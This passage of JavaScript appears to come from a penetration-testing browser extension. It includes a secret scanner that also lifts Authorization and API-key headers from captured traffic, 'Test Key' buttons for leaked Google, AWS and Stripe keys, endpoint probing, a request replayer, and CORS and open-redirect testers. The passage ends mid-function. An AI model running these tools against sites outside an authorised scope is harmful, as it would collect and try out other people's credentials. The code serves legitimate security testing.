  if (!sr?.ok) { b.innerHTML = errMsg(sr?.error||'Cannot access page'); return; }
  const findings = [];
  for (const url of sr.data.external.slice(0,20)) { try { const r = await chrome.runtime.sendMessage({type:'FETCH_JS',url}); if(r.ok) scanSecrets(r.text,url,findings); } catch{} }
  sr.data.inline.slice(0,10).forEach((txt,i) => scanSecrets(txt, activeTabUrl + ' [inline-' + i + ']', findings));

  // Also scan captured XHR request headers for Bearer tokens, API keys, etc.
  try {
    const reqRes = await chrome.runtime.sendMessage({ type: 'GET_CAPTURED_REQUESTS', tabId: activeTabId });
    const capturedReqs = reqRes.requests || [];
    capturedReqs.forEach(req => {
      if (!req.requestHeaders) return;
      req.requestHeaders.forEach(h => {
        const name = h.name.toLowerCase();
        const val = h.value || '';
        if (name === 'authorization' && val.length > 10) {
          const key = 'xhr-auth:' + val.slice(0, 40);
          if (!findings.some(f => f.match === val.slice(0, 200))) {
            const isBearerJwt = /^Bearer\s+eyJ/i.test(val);
            findings.push({ name: isBearerJwt ? 'Bearer JWT (XHR)' : 'Authorization Header (XHR)', match: val.slice(0, 200), severity: 'high', source: 'XHR → ' + (req.url || '').slice(0, 80), context: req.method + ' ' + req.url, entropy: shannonEntropy(val).toFixed(1) });
          }
        }
        if ((name === 'x-api-key' || name === 'api-key' || name === 'x-auth-token') && val.length > 8) {
          if (!findings.some(f => f.match === val)) {
            findings.push({ name: 'API Key Header (XHR)', match: val, severity: 'high', source: 'XHR → ' + (req.url || '').slice(0, 80), context: h.name + ': ' + val, entropy: shannonEntropy(val).toFixed(1) });
          }
        }
      });
    });
  } catch {}

  if (findings.length) { const bd=document.getElementById('badge-discovery'); bd.textContent=findings.length; bd.classList.remove('hidden'); }
  b.innerHTML = `<div class="text-xs text-muted mb-6">Page: ${esc(activeTabUrl)}</div>` +
    (findings.length===0 ? '<div class="text-muted text-sm">No secrets detected</div>' :
    findings.slice(0,50).map(f => {
      const isGoogleKey = f.name === 'Google API Key';
      const isAwsKey = f.name === 'AWS Access Key';
      const isStripeKey = f.name === 'Stripe Secret';
      return `<div class="result-item ${f.severity}" style="cursor:pointer">
      <div class="result-label"><span class="result-tag tag-${f.severity}">${f.severity}</span>${esc(f.name)}${isGoogleKey ? ` <button class="btn-sm" data-test-key="${f.match}" style="padding:1px 5px;font-size:8px;margin-left:4px">Test Key</button>` : ''}${isAwsKey ? ` <button class="btn-sm" data-test-aws="${f.match}" style="padding:1px 5px;font-size:8px;margin-left:4px">Test AWS</button>` : ''}${isStripeKey ? ` <button class="btn-sm" data-test-stripe="${f.match}" style="padding:1px 5px;font-size:8px;margin-left:4px">Test Stripe</button>` : ''}<span class="text-xs text-muted" style="margin-left:4px">H=${f.entropy || '?'}</span></div>
      <div class="result-value">${esc(f.match.slice(0,80))}</div>
      ${f.context ? `<div style="margin-top:3px;padding:3px 6px;background:var(--surface-hover);border-radius:3px;font-family:var(--font-mono);font-size:9px;color:var(--text-tertiary);max-height:36px;overflow:hidden">…${esc(f.context)}…</div>` : ''}
      <div class="text-xs text-muted">Found in: ${esc(f.source)}</div>
    </div>`; }).join(''));
  finalizeResults('discovery');
}
function scanSecrets(text,source,findings){
  // Skip third-party libraries that generate tons of false positives
  if (/openpgp\.min\.js|cookiehub\.net|google-analytics|googletagmanager/.test(source)) return;
  // Content-based library detection: skip crypto libraries by content signature
  if (text.length > 5000 && /BEGIN PGP|PRIVATE KEY.*ENCRYPTED|secp256k1|ed25519.*curve/i.test(text.slice(0, 2000))) return;
  for(const p of SECRET_PATTERNS){const re=new RegExp(p.regex.source,p.regex.flags);let m;while((m=re.exec(text))!==null){const v=m[1]||m[0];if(v.length<8)continue;
  // Entropy check: skip low-entropy matches (repeated chars, sequential)
  if(p.severity==='high'||p.severity==='medium'){
    const ent=shannonEntropy(v);
    if(ent<2.5&&p.name!=='Private Key')continue; // Very low entropy = likely placeholder
  }
  // IP Address false positive filters
  if(p.name==='IP Address'){
    if(v.startsWith('0.')||v.startsWith('127.')||v.startsWith('10.')||v.startsWith('192.168.'))continue;
    if(/\b0\d/.test(v))continue;
    const before=text.slice(Math.max(0,m.index-5),m.index);
    if(/[,\-lmcsqtaLMCSQTA]\s*\.?\d*\.?$/.test(before))continue;
    const around=text.slice(Math.max(0,m.index-30),Math.min(text.length,m.index+v.length+30));
    if(/["'][0-9.]+["']\s*:|curve|secp|brainpool|p256|p384|p521|oid/i.test(around))continue;
  }
  // Generic Secret false positive filters
  if(p.name==='Generic Secret'){
    if(/%filtered%|%redacted%|\[FILTERED\]|\[REDACTED\]|placeholder|example|test123|changeme|YOUR_|TODO|FIXME/i.test(v))continue;
    if(/cdnjs\.cloudflare|cdn\.jsdelivr|fonts\.googleapis/.test(source))continue;
  }
  // Bearer token filter: skip documentation examples
  if(p.name==='Bearer Token'){
    const around=text.slice(Math.max(0,m.index-40),Math.min(text.length,m.index+v.length+40));
    if(/example|placeholder|YOUR_TOKEN|INSERT_TOKEN|TODO|header|authorization.*:/i.test(around))continue;
  }
  // Twilio SK filter: verify it's not a random hex substring
  if(p.name==='Twilio API Key'){
    const around=text.slice(Math.max(0,m.index-10),Math.min(text.length,m.index+v.length+10));
    if(/[0-9a-f]{40,}/i.test(around))continue; // Part of a longer hash
  }
  if(!findings.some(f=>f.match===v)){
    const start=Math.max(0,m.index-80);const end=Math.min(text.length,m.index+v.length+80);
    const ctx=text.slice(start,end).replace(/\n/g,' ').trim();
    findings.push({name:p.name,match:v,severity:p.severity,source,context:ctx,entropy:shannonEntropy(v).toFixed(1)})
  }}}
}

async function toolEndpoints() {
  const b = showResults('discovery', 'Endpoints', true);
  b.innerHTML = '<div class="loading-text"><span class="spinner"></span> Extracting…</div>';
  const sr = await msgTab({ type: 'GET_SCRIPT_URLS' });
  if (!sr?.ok) { b.innerHTML = errMsg(sr?.error||'Cannot access page'); return; }
  const epMap = new Map();
  const proc = (t, src) => { for(const p of ENDPOINT_PATTERNS){const re=new RegExp(p.source,p.flags);let m;while((m=re.exec(t))!==null){const ep=m[1]||m[0];if(isRealEndpoint(ep)&&!epMap.has(ep))epMap.set(ep,src)}} };
  for(const url of sr.data.external.slice(0,20)){try{const r=await chrome.runtime.sendMessage({type:'FETCH_JS',url});if(r.ok)proc(r.text,url)}catch{}}
  sr.data.inline.forEach((t,i) => proc(t, activeTabUrl + ' [inline]'));

  // Also scan HTML source for data attributes with URLs
  try {
    const hiddenRes = await msgTab({ type: 'FIND_HIDDEN_ELEMENTS' });
    if (hiddenRes?.ok) {
      (hiddenRes.data.dataAttrs || []).forEach(attr => {
        if (attr.value && (attr.value.startsWith('/') || attr.value.startsWith('http')) && isRealEndpoint(attr.value)) {
          if (!epMap.has(attr.value)) epMap.set(attr.value, 'data-attr: ' + attr.attr);
        }
      });
    }
  } catch {}

  // Scan captured XHR/fetch requests (runtime API calls Burp would see)
  try {
    const reqRes = await chrome.runtime.sendMessage({ type: 'GET_CAPTURED_REQUESTS', tabId: activeTabId });
    const capturedReqs = reqRes.requests || [];
    capturedReqs.forEach(req => {
      if (!req.url) return;
      try {
        const ru = new URL(req.url);
        const path = ru.pathname + ru.search;
        // Skip static assets
        if (/\.(css|js|png|jpg|jpeg|gif|svg|woff|woff2|ttf|ico|map|webp)(\?|$)/i.test(ru.pathname)) return;
        // Skip tracking/analytics
        if (/google-analytics|googletagmanager|facebook\.com|doubleclick|clarity\.ms|hotjar/i.test(req.url)) return;
        const ep = ru.origin === new URL(activeTabUrl).origin ? path : req.url;
        if (!epMap.has(ep) && ep.length > 3) {
          epMap.set(ep, 'XHR ' + (req.method || 'GET'));
        }
      } catch {}
    });
  } catch {}

  const sorted = [...epMap.entries()].sort((a,c) => a[0].localeCompare(c[0]));
  if (!sorted.length) { b.innerHTML = '<div class="text-muted text-sm">No endpoints</div>'; finalizeResults('discovery'); return; }

  // Group by host
  const targetDomain = getRootDomain(activeTabDomain);
  const groups = { target: [], thirdParty: [], paths: [] };
  const interestingPatterns = [/staging|stag\b|dev\b|test\b|sandbox|internal|debug|admin|console/i, /cognito|amazonaws|azure|firebase/i, /graphql/i, /\?key=/i];
  const priorityPatterns = [/admin/i, /auth/i, /login/i, /password|passwd/i, /reset/i, /token/i, /delete/i, /upload/i, /export/i, /debug/i, /config/i, /internal/i, /webhook/i, /user/i, /payment/i, /checkout/i, /order/i];

  sorted.forEach(([ep, src]) => {
    const isInteresting = interestingPatterns.some(p => p.test(ep));
    const isPriority = priorityPatterns.some(p => p.test(ep));
    if (ep.startsWith('/')) {
      groups.paths.push({ ep, src, interesting: isInteresting, priority: isPriority });
    } else {
      try {
        const host = new URL(ep).hostname;
        const root = getRootDomain(host);
        if (root === targetDomain) groups.target.push({ ep, src, interesting: isInteresting, priority: isPriority });
        else groups.thirdParty.push({ ep, src, interesting: isInteresting, priority: isPriority });
      } catch { groups.paths.push({ ep, src, interesting: isInteresting, priority: isPriority }); }
    }
  });

  const renderGroup = (items) => items.sort((a,c) => (c.priority?1:0) - (a.priority?1:0)).map(({ ep, src, interesting, priority }) =>
    `<div class="result-item ${priority ? 'medium' : interesting ? 'medium' : 'info'}" style="cursor:pointer">
      <div class="result-value">${priority ? '🎯 ' : interesting ? '⚠ ' : ''}${esc(ep)}</div>
      <div class="text-xs text-muted">in: ${esc(src.split('/').pop() || src)}</div>
    </div>`).join('');

  let html = `<div class="text-xs text-muted mb-4">Page: ${esc(activeTabUrl)}</div>
    <div class="flex-between mb-6"><span class="text-sm">${sorted.length} endpoints</span><button class="btn-sm primary" id="ep-probe">Probe API Paths</button></div><div id="ep-list">`;
  if (groups.paths.length) html += `<div class="result-label mt-4 mb-4">API Paths (${groups.paths.length})</div>${renderGroup(groups.paths)}`;
  if (groups.target.length) html += `<div class="result-label mt-6 mb-4">Target URLs — ${esc(targetDomain)} (${groups.target.length})</div>${renderGroup(groups.target)}`;
  if (groups.thirdParty.length) html += `<div class="result-label mt-6 mb-4">Third-party (${groups.thirdParty.length})</div>${renderGroup(groups.thirdParty)}`;
  html += '</div>';
  b.innerHTML = html;

  b.querySelector('#ep-probe')?.addEventListener('click', async () => {
    const btn = b.querySelector('#ep-probe'); btn.disabled = true; btn.textContent = 'Probing…';
    const apiPaths = groups.paths.map(x => x.ep);
    if (!apiPaths.length) { btn.textContent = 'No paths to probe'; return; }
    const r = await chrome.runtime.sendMessage({ type: 'PROBE_ENDPOINTS', endpoints: apiPaths, baseUrl: activeTabUrl });
    if (!r.ok) { btn.textContent = 'Failed'; return; }
    const alive = r.results.filter(x => x.status >= 200 && x.status < 400);
    // Replace just the paths section
    const pathsEl = b.querySelector('#ep-list');
    const existingTarget = groups.target.length ? `<div class="result-label mt-6 mb-4">Target URLs — ${esc(targetDomain)} (${groups.target.length})</div>${renderGroup(groups.target)}` : '';
    const existingTP = groups.thirdParty.length ? `<div class="result-label mt-6 mb-4">Third-party (${groups.thirdParty.length})</div>${renderGroup(groups.thirdParty)}` : '';
    pathsEl.innerHTML = `<div class="result-label mt-4 mb-4">API Paths — ${alive.length} alive / ${r.results.length} probed</div>` +
      r.results.sort((a,c) => (typeof a.status==='number'?a.status:999) - (typeof c.status==='number'?c.status:999))
      .map(x => {
        const sev = x.status === 200 ? 'high' : x.status === 403 || x.status === 401 ? 'medium' : x.status >= 200 && x.status < 400 ? 'low' : 'info';
        return `<div class="result-item ${sev}" style="cursor:pointer">
          <div class="result-label"><span class="result-tag tag-${sev}">${x.status}</span> ${esc(x.endpoint)}</div>
          ${x.size ? `<div class="text-xs text-muted">${x.size}b</div>` : ''}
        </div>`;
      }).join('') + existingTarget + existingTP;
    btn.textContent = 'Probed'; finalizeResults('discovery');
  });
  finalizeResults('discovery');
}

async function toolHidden() {
  const b = showResults('discovery', 'Hidden', true);
  const res = await msgTab({ type: 'FIND_HIDDEN_ELEMENTS' });
  const comments = await msgTab({ type: 'FIND_COMMENTS' });
  if (!res?.ok) { b.innerHTML = errMsg(res?.error||'Cannot access page'); return; }
  const d = res.data; const total = d.hiddenInputs.length+d.hiddenDivs.length+d.disabledInputs.length+d.dataAttrs.length+(comments.data?.length||0);
  let html = `<div class="text-xs text-muted mb-4">Page: ${esc(activeTabUrl)}</div><div class="flex-between mb-6"><span class="text-sm">${total} hidden items</span><div><button class="btn-sm primary" id="btn-reveal">Reveal All</button> <button class="btn-sm" id="btn-unreveal" style="display:none">Undo Reveal</button></div></div>`;
  const securityNames = /admin|debug|role|price|is_?admin|is_?staff|privilege|permission|internal|secret|token|api_?key|password|hidden_?id|user_?id|account/i;

  // Hidden inputs
  if(d.hiddenInputs.length) {
    html += `<div class="result-label mt-4 mb-4">Hidden Inputs (${d.hiddenInputs.length})</div>`;
    html += d.hiddenInputs.map(h => {
      const isSecurity = securityNames.test(h.name) || securityNames.test(h.value);
      return `<div class="result-item ${isSecurity?'high':'medium'}" style="cursor:pointer">
        <div class="result-value">${isSecurity?'🎯 ':''}${esc(h.name)} = ${esc(h.value)}</div>
        ${h.form ? `<div class="text-xs text-muted">Form: ${esc(h.form)}</div>` : ''}
        ${isSecurity ? `<div class="text-xs text-accent">Security-relevant — try modifying this value</div>` : ''}
      </div>`;
    }).join('');
  }

  // Hidden divs
  if(d.hiddenDivs.length) {
    html += `<div class="result-label mt-4 mb-4">Hidden Elements (${d.hiddenDivs.length})</div>`;
    html += d.hiddenDivs.slice(0, 25).map(h => {
      const isSecurity = securityNames.test(h.id) || securityNames.test(h.class) || securityNames.test(h.text);
      return `<div class="result-item ${isSecurity?'medium':'low'}" style="cursor:pointer">
        <div class="result-label">${esc(h.tag)}${h.id ? '#' + esc(h.id) : ''}${h.class?.trim() ? '.' + esc(h.class.trim().split(' ')[0]) : ''}</div>
        <div class="result-value">${esc(h.text)}</div>
      </div>`;
    }).join('');
  }

  // Disabled inputs
  if(d.disabledInputs.length) {
    html += `<div class="result-label mt-4 mb-4">Disabled Fields (${d.disabledInputs.length})</div>`;
    html += d.disabledInputs.map(h => {
      return `<div class="result-item low" style="cursor:pointer">
        <div class="result-value">${esc(h.tag)} [${esc(h.type||'text')}] ${esc(h.name)} = ${esc(h.value)}</div>
      </div>`;
    }).join('');
  }

  // Data attributes
  if(d.dataAttrs.length) {
    html += `<div class="result-label mt-4 mb-4">Data Attributes (${d.dataAttrs.length})</div>`;
    html += d.dataAttrs.slice(0,20).map(a => `<div class="result-item low" style="cursor:pointer"><div class="result-value">${esc(a.attr)} = ${esc(a.value)}</div></div>`).join('');
  }

  // Comments
  if(comments.data?.length) {
    html += `<div class="result-label mt-4 mb-4">Comments (${comments.data.length})</div>`;
    html += comments.data.slice(0,20).map(c => `<div class="result-item info"><div class="result-value">${esc(c.slice(0,120))}</div></div>`).join('');
  }

  b.innerHTML = html;

  // Reveal toggle
  const revealBtn = b.querySelector('#btn-reveal');
  const unrevealBtn = b.querySelector('#btn-unreveal');
  revealBtn?.addEventListener('click', async () => {
    await msgTab({ type: 'REVEAL_HIDDEN' });
    revealBtn.style.display = 'none';
    unrevealBtn.style.display = 'inline-block';
    log('Hidden elements revealed on page', 'success');
  });
  unrevealBtn?.addEventListener('click', async () => {
    await msgTab({ type: 'UNREVEAL_HIDDEN' });
    unrevealBtn.style.display = 'none';
    revealBtn.style.display = 'inline-block';
    log('Reveal undone (reload page for full restore)', 'success');
  });
  finalizeResults('discovery');
}

async function toolLinks() {
  const b = showResults('discovery', 'Links', true);
  const res = await msgTab({ type: 'EXTRACT_LINKS' });
  if (!res?.ok) { b.innerHTML = errMsg(res?.error||'Cannot access page'); return; }
  const d = res.data;
  let currentType = 'internal';
  b.innerHTML = `<div class="text-xs text-muted mb-4">Page: ${esc(activeTabUrl)}</div>
    <div class="codec-row mb-6"><button class="btn-sm" data-lk="internal">Internal (${d.internal.length})</button><button class="btn-sm" data-lk="external">External (${d.external.length})</button><button class="btn-sm" data-lk="interesting">Files (${d.interesting.length})</button><button class="btn-sm" data-lk="emails">Emails (${d.emails.length})</button></div>
    <div id="lk-c"></div>`;
  const show = type => {
    currentType = type;
    const c = b.querySelector('#lk-c');
    const items = type === 'emails' ? d.emails : d[type].map(l => l.url || l);
    c.innerHTML = items.slice(0, 60).map(i => `<div class="result-item ${type==='interesting'?'medium':'info'}" style="cursor:pointer"><div class="result-value">${esc(i)}</div></div>`).join('') +
      `<div class="tool-input-row mt-6"><button class="btn-sm" id="cp-lk">Copy All (${items.length})</button>${type !== 'emails' ? `<button class="btn-sm primary" id="probe-lk">Probe Status</button>` : ''}</div>`;
    c.querySelector('#cp-lk')?.addEventListener('click', () => copyText(items.join('\n')));
    c.querySelector('#probe-lk')?.addEventListener('click', async () => {
      const probeBtn = c.querySelector('#probe-lk'); probeBtn.disabled = true; probeBtn.textContent = 'Probing…';
      const r = await chrome.runtime.sendMessage({ type: 'PROBE_LINKS', links: items.slice(0, 30) });
      if (!r.ok) { probeBtn.textContent = 'Failed'; return; }
      const alive = r.results.filter(x => x.status >= 200 && x.status < 400);
      const dead = r.results.filter(x => x.status === 'dead');
      // Replace list with probed results
      const listHtml = r.results.map(x => {
        const sev = x.status === 'dead' ? 'info' : x.status === 200 ? 'high' : x.status >= 300 && x.status < 400 ? 'low' : x.status >= 400 ? 'medium' : 'info';
        const tag = x.status === 'dead' ? 'DEAD' : x.status;
        return `<div class="result-item ${sev}" style="cursor:pointer">
          <div class="result-label"><span class="result-tag tag-${sev}">${tag}</span></div>
          <div class="result-value">${esc(x.url)}</div>
          ${x.finalUrl && x.finalUrl !== x.url ? `<div class="text-xs text-muted">→ ${esc(x.finalUrl)}</div>` : ''}
        </div>`;
      }).join('');
      c.innerHTML = `<div class="text-xs text-muted mb-6">${alive.length} alive, ${dead.length} dead</div>${listHtml}<div class="mt-6"><button class="btn-sm" id="cp-lk2">Copy Alive</button></div>`;
      c.querySelector('#cp-lk2')?.addEventListener('click', () => copyText(alive.map(x => x.url).join('\n')));
    });
  };
  b.querySelectorAll('[data-lk]').forEach(btn => btn.addEventListener('click', () => show(btn.dataset.lk)));
  show('internal'); finalizeResults('discovery');
}

async function toolReplayer() {
  const b = showResults('utility', 'Replayer', true);
  const res = await chrome.runtime.sendMessage({ type: 'GET_CAPTURED_REQUESTS', tabId: activeTabId });
  const reqs = res.requests||[];
  if(!reqs.length){ b.innerHTML='<div class="text-muted text-sm">No requests captured. Browse first.</div>'; return; }
  const display = reqs.slice(-20).reverse();
  b.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${reqs.length} captured</span><button class="btn-sm" id="rp-clear" style="font-size:9px">Clear All</button></div>`+display.map((r,i)=>{const u=new URL(r.url);const hasBody=r.body&&r.body.length>0;return`<div class="result-item ${hasBody?'medium':'info'}" style="cursor:pointer" data-ri="${i}"><div class="result-label"><span class="result-tag tag-${hasBody?'medium':'info'}">${r.method||'GET'}</span>${r.statusCode||'?'}</div><div class="result-value">${esc(u.pathname+u.search).slice(0,70)}</div>${hasBody?`<div class="text-xs text-muted">Body: ${esc(r.body.slice(0,60))}${r.body.length>60?'…':''}</div>`:''}</div>`}).join('')+
  `<div class="mt-8" id="rp-det" style="display:none"><div class="tool-input-row"><select class="tool-select" id="rp-m" style="width:80px"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option><option>OPTIONS</option></select></div><input class="tool-input mb-6" id="rp-u"><textarea class="tool-input mb-6" id="rp-h" rows="2" placeholder="Headers JSON">{}</textarea><textarea class="tool-input mb-6" id="rp-b" rows="3" placeholder="Request body (form data or JSON)"></textarea><div class="tool-input-row"><button class="btn-sm primary" id="rp-send">Send</button><button class="btn-sm" id="rp-curl">Copy cURL</button></div><pre class="result-value mt-6" id="rp-out" style="max-height:200px;overflow:auto;white-space:pre-wrap"></pre></div>`;
  b.querySelectorAll('[data-ri]').forEach(el=>el.addEventListener('click',()=>{
    const r=display[+el.dataset.ri];
    b.querySelector('#rp-det').style.display='block';
    b.querySelector('#rp-m').value=r.method||'GET';
    b.querySelector('#rp-u').value=r.url;
    if(r.body) b.querySelector('#rp-b').value=r.body;
    // Pre-fill headers if available
    if(r.requestHeaders){try{const h={};r.requestHeaders.forEach(rh=>{if(!['host','connection','content-length','accept-encoding'].includes(rh.name.toLowerCase()))h[rh.name]=rh.value});b.querySelector('#rp-h').value=JSON.stringify(h,null,2)}catch{}}
  }));
  b.querySelector('#rp-send')?.addEventListener('click',async()=>{let h={};try{h=JSON.parse(b.querySelector('#rp-h').value)}catch{};const r=await chrome.runtime.sendMessage({type:'REPLAY_REQUEST',url:b.querySelector('#rp-u').value,method:b.querySelector('#rp-m').value,headers:h,body:b.querySelector('#rp-b').value||undefined});b.querySelector('#rp-out').textContent=r.ok?`HTTP ${r.status}\n${JSON.stringify(r.headers,null,2)}\n\n${r.text}`:'Error: '+r.error});
  b.querySelector('#rp-curl')?.addEventListener('click',()=>{
    const m=b.querySelector('#rp-m').value, u=b.querySelector('#rp-u').value, bd=b.querySelector('#rp-b').value;
    let cmd=`curl -X ${m} '${u}'`;
    try{const h=JSON.parse(b.querySelector('#rp-h').value);Object.entries(h).forEach(([k,v])=>{cmd+=` -H '${k}: ${v}'`})}catch{}
    if(bd) cmd+=` -d '${bd}'`;
    copyText(cmd);
  });
  b.querySelector('#rp-clear')?.addEventListener('click', async () => {
    // Clear captured requests for this tab
    await chrome.runtime.sendMessage({ type: 'CLEAR_CAPTURED_REQUESTS', tabId: activeTabId });
    b.innerHTML = '<div class="text-muted text-sm">Cleared. Browse to capture new requests.</div>';
    log('Replayer cleared', 'success');
  });
  finalizeResults('offensive');
}

async function toolCors() {
  const b = showResults('offensive','CORS',false);
  b.innerHTML=`<div class="tool-input-row mb-6"><input class="tool-input" id="cors-u" value="${esc(activeTabUrl)}"><button class="btn-sm primary" id="cors-go">Test 9 Origins</button></div><div id="cors-o"></div>`;
  b.querySelector('#cors-go').addEventListener('click', async () => {
    const url = b.querySelector('#cors-u').value, o = b.querySelector('#cors-o');
    o.innerHTML = '<div class="loading-text"><span class="spinner"></span> Testing CORS origins…</div>';
    const r = await chrome.runtime.sendMessage({ type: 'TEST_CORS', url });
    if (!r.ok) { o.innerHTML = errMsg('Failed'); return; }
    const criticals = r.results.filter(x => x.critical);
    const vulns = r.results.filter(x => x.vuln);
    const wildcardOnly = r.results.filter(x => x.wildcardOnly);
    let preflightHtml = '';
    if (r.preflight) {
      const pf = r.preflight;
      preflightHtml = `<div class="result-item ${pf.error ? 'info' : 'low'}" style="margin-bottom:8px"><div class="result-label">Preflight (OPTIONS)</div><div class="result-value">${pf.error ? 'Error: ' + esc(pf.error) : `Status: ${pf.status} | ACAO: ${esc(pf.acao || 'none')} | Methods: ${esc(pf.methods || 'none')}`}</div></div>`;
    }
    o.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${r.results.length} tested</span><span class="text-sm ${criticals.length?'text-accent':''}" style="font-weight:700">${criticals.length} critical, ${vulns.length} reflected</span></div>${preflightHtml}` +
      r.results.map(x => {
        const sev = x.critical ? 'high' : x.vuln ? 'medium' : x.wildcardOnly ? 'low' : 'info';
        return `<div class="result-item ${sev}">
          <div class="result-label"><span class="result-tag tag-${sev}">${x.critical ? 'CRIT' : x.vuln ? 'VULN' : x.wildcardOnly ? 'WILD' : x.status || 'OK'}</span> ${esc(x.label)}</div>
          <div class="result-value">Origin: ${esc(x.origin)}<br>ACAO: ${esc(x.acao || 'none')} | ACAC: ${esc(x.acac || 'none')}</div>
          ${x.critical ? '<div class="text-xs text-accent" style="font-weight:600">Origin reflected WITH credentials — exploitable CORS!</div>' : ''}
          ${x.vuln && !x.critical ? '<div class="text-xs" style="color:var(--warning)">Origin reflected (no credentials — lower impact)</div>' : ''}
          ${x.wildcardOnly ? '<div class="text-xs text-muted">Wildcard (*) without credentials — common for public APIs, generally safe</div>' : ''}
        </div>`;
      }).join('');
    finalizeResults('offensive');
  });
}

async function toolRedirect() {
  const b = showResults('offensive','Redirect',false);
  // Auto-detect redirect params from current URL
  const u = new URL(activeTabUrl);
  const redirParams = ['url', 'redirect', 'redirect_uri', 'next', 'return', 'returnTo', 'goto', 'dest', 'destination', 'redir', 'return_url', 'continue', 'retUrl', 'forward', 'target'];
  const detected = [...u.searchParams.keys()].filter(k => redirParams.includes(k.toLowerCase()));

  b.innerHTML = `<div class="text-sm mb-6">Active redirect testing with 12 bypass payloads</div>
    <div class="tool-input-row"><input class="tool-input" id="rd-url" value="${esc(activeTabUrl)}" placeholder="URL with redirect param"></div>
    <div class="tool-input-row"><input class="tool-input" id="rd-param" value="${esc(detected[0] || '')}" placeholder="Param name (e.g. redirect, next, return)" style="width:50%"><button class="btn-sm primary" id="rd-go">Test 12 Payloads</button></div>
    ${detected.length ? '<div class="text-xs mb-6" style="color:var(--success)">Auto-detected redirect param: ' + detected.map(esc).join(', ') + '</div>' : '<div class="text-xs text-muted mb-6">No redirect params auto-detected. Enter the param name manually.</div>'}
    <div id="rd-out"></div>`;

  b.querySelector('#rd-go')?.addEventListener('click', async () => {
    const url = b.querySelector('#rd-url').value;
    const param = b.querySelector('#rd-param').value.trim();
    const out = b.querySelector('#rd-out');
    if (!param) { out.innerHTML = '<div class="text-muted text-sm">Enter a redirect parameter name</div>'; return; }
    out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Testing 12 redirect payloads (authenticated)...</div>';
    const r = await chrome.runtime.sendMessage({ type: 'TEST_REDIRECT', url, param });
    if (!r.ok) { out.innerHTML = errMsg(r.error); return; }
    const vulns = r.results.filter(x => x.redirectsToEvil);
    out.innerHTML = '<div class="flex-between mb-6"><span class="text-sm">' + r.results.length + ' tested</span><span class="text-sm ' + (vulns.length ? 'text-accent' : 'text-muted') + '" style="font-weight:700">' + vulns.length + ' redirects to attacker</span></div>' +
      r.results.map(x => {
        const sev = x.redirectsToEvil ? 'high' : x.isRedirect ? 'medium' : x.bodyCheck ? 'low' : 'info';
        const tag = x.redirectsToEvil ? 'VULN' : x.isRedirect ? 'REDIR' : x.bodyCheck ? 'REFL' : x.status;
        return '<div class="result-item ' + sev + '" style="cursor:pointer"><div class="result-label"><span class="result-tag tag-' + sev + '">' + tag + '</span> ' + esc(x.label) + '</div><div class="result-value">' + esc(x.payload) + '</div>' +
          (x.isRedirect ? '<div class="text-xs ' + (x.redirectsToEvil ? 'text-accent' : 'text-muted') + '">Location: ' + esc(x.location) + '</div>' : '') +
          (x.bodyCheck ? '<div class="text-xs" style="color:var(--warning)">' + esc(x.bodyCheck) + '</div>' : '') +
          (x.error ? '<div class="text-xs text-muted">' + esc(x.error) + '</div>' : '') +
          '</div>';
      }).join('');
    finalizeResults('offensive');
    log('Redirect: ' + vulns.length + ' open redirects found', vulns.length ? 'warn' : 'success');
  });
}

function toolCodec() {
  const b = showResults('utility','Codec',false);
  b.innerHTML=`<textarea class="tool-input mb-6" id="ci" rows="3" placeholder="Input…"></textarea><div class="codec-row"><button class="btn-sm" data-e="b64e">B64 Enc</button><button class="btn-sm" data-e="b64d">B64 Dec</button><button class="btn-sm" data-e="urle">URL Enc</button><button class="btn-sm" data-e="urld">URL Dec</button><button class="btn-sm" data-e="htmle">HTML Ent</button><button class="btn-sm" data-e="htmld">HTML Dec</button><button class="btn-sm" data-e="hex">Hex</button><button class="btn-sm" data-e="unhex">Unhex</button><button class="btn-sm" data-e="jwt">JWT</button><button class="btn-sm" data-e="rot13">ROT13</button><button class="btn-sm" data-e="len">Length</button></div><textarea class="tool-input mt-6" id="co" rows="3" readonly placeholder="Output…"></textarea><div class="mt-6"><button class="btn-sm" id="cc-cp">Copy</button> <button class="btn-sm" id="cc-sw">↕ Swap</button></div>`;
  const i=b.querySelector('#ci'),o=b.querySelector('#co');
  b.querySelectorAll('[data-e]').forEach(btn=>btn.addEventListener('click',()=>{const v=i.value;try{switch(btn.dataset.e){case'b64e':o.value=btoa(unescape(encodeURIComponent(v)));break;case'b64d':o.value=decodeURIComponent(escape(atob(v)));break;case'urle':o.value=encodeURIComponent(v);break;case'urld':o.value=decodeURIComponent(v);break;case'htmle':o.value=v.replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));break;case'htmld':{const d=document.createElement('div');d.innerHTML=v;o.value=d.textContent;break}case'hex':o.value=[...v].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ');break;case'unhex':o.value=v.replace(/\s/g,'').match(/.{2}/g)?.map(x=>String.fromCharCode(parseInt(x,16))).join('')||'';break;case'jwt':{const p=v.split('.');o.value=JSON.stringify({header:JSON.parse(atob(p[0].replace(/-/g,'+').replace(/_/g,'/'))),payload:JSON.parse(atob(p[1].replace(/-/g,'+').replace(/_/g,'/')))},null,2);break}case'rot13':o.value=v.replace(/[a-zA-Z]/g,c=>String.fromCharCode(c.charCodeAt(0)+(c.toLowerCase()<'n'?13:-13)));break;case'len':o.value=`${v.length} chars, ${new Blob([v]).size} bytes`;break}}catch(e){o.value='Error: '+e.message}}));
  b.querySelector('#cc-cp')?.addEventListener('click',()=>copyText(o.value));
  b.querySelector('#cc-sw')?.addEventListener('click',()=>{i.value=o.value;o.value=''});
}

function toolScope() {
  const b = showResults('scope','Scope',false);
  const render = () => {
    b.innerHTML=`<div class="tool-input-row mb-6"><input class="tool-input" id="sc-i" placeholder="Add domain"><button class="btn-sm primary" id="sc-a">Add</button></div><div class="flex-between mb-6"><span class="text-sm">${scopeDomains.length} in scope</span><button class="btn-sm" id="sc-ac">+ Current</button></div><ul class="scope-list">${scopeDomains.map((d,i)=>`<li class="scope-item"><button class="remove-scope" data-idx="${i}">✕</button><span>${esc(d)}</span></li>`).join('')}</ul>`;
